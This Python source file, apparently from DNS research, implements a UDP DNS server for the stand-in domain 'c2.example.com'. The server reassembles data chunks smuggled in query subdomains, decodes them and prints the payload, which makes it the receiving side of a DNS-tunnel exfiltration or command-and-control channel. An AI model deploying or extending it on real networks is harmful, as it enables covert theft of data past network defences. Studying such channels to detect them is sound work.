import socket
from DNS_Research import decode
import struct

APEX_DOMAIN = "c2.example.com"
port = 8080

def build_response(data: bytes, question_end, response_type="TXT", MSG="Hello World!"):
    # Header (12 Bytes)
    trans_id = data[:2]
    flags = b'\x81\x80'
    qdcount = data[4:6]
    ancount = b'\x00\x01'
    nscount = b'\x00\x00'
    arcount = b'\x00\x00'
    
    header = trans_id + flags + qdcount + ancount + nscount + arcount
    
    question = data[12:question_end + 4] # Question section (QNAME + QTYPE + QCLASS)
    
    if response_type != "TXT":
        answer = (
            b'\xc0\x0c' # Pointer to the domain name in the question section
            b'\x00\x01' # Type A
            b'\x00\x01' # Class IN
            b'\x00\x00\x00\x3c' # TTL (60 seconds   
            b'\x00\x04' # RDLENGTH (4 bytes for IPv4 address)
            + socket.inet_aton("127.0.0.1") # RDATA (IPv4 address)
            )
        return header + question + answer
    
    else:
        answer_txt = (  
            b'\xc0\x0c' # Pointer to the domain name in the question section
            b'\x00\x10' # Type TXT
            b'\x00\x01' # Class In
            b'\x00\x00\x00\x3c' # TTL (60 seconds)        
        )
        
        msg_bytes = MSG.encode("ascii") if isinstance(MSG, str) else MSG
        
        txt_rdata = bytes([len(msg_bytes)]) + msg_bytes
        
        rdlength = struct.pack("!H", len(txt_rdata))
        
        return header + question + answer_txt + rdlength + txt_rdata
  
    
def parse_qname(data: bytes, offset: int):                                                
        labels = []                                                                           
        while data[offset] != 0:                                                              
            length = data[offset]                                                             
            offset += 1                                                                       
            labels.append(data[offset:offset + length].decode('ascii'))                       
            offset += length                                                               
        offset += 1                                                                           
        return '.'.join(labels), offset

def start_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', port))
    print(f"[+] Escutando em 0.0.0.0:{port}")
    
    sessions = {}
    
    while True:
        data, addr = sock.recvfrom(512)
        qname, question_end = parse_qname(data, 12)

        if qname.endswith(APEX_DOMAIN):
            prefix = qname[:-len(APEX_DOMAIN) - 1]
            parts = prefix.split('.')
            
            if len(parts) >= 4:
                session_id = parts[0]
                seq = int(parts[1])
                total = int(parts[2])
                chunk = parts[3]
                
                if session_id not in sessions:
                    sessions[session_id] = {"total": total, "chunks": {}}
            
                sessions[session_id]["chunks"][seq] = chunk
                print(f"[>] Sessão {session_id} - chunk {seq+1}/{total} recebido")
                
                sessao = sessions[session_id]
                if len(sessao["chunks"]) == sessao["total"]:
                    fqdns_ordered = [
                        f"{session_id}.{i}.{sessao['total']}.{sessao['chunks'][i]}.{APEX_DOMAIN}"
                        for i in sorted(sessao["chunks"].keys())
                    ]
                    
                    payload = decode(fqdns_ordered, APEX_DOMAIN)
                    print(f"[+] Sessão {session_id} COMPLETA! Payload: {payload}")
                    
                    del sessions[session_id]
            
        response = build_response(data, question_end)
        sock.sendto(response, addr)
                        
if __name__ == "__main__":
    start_server()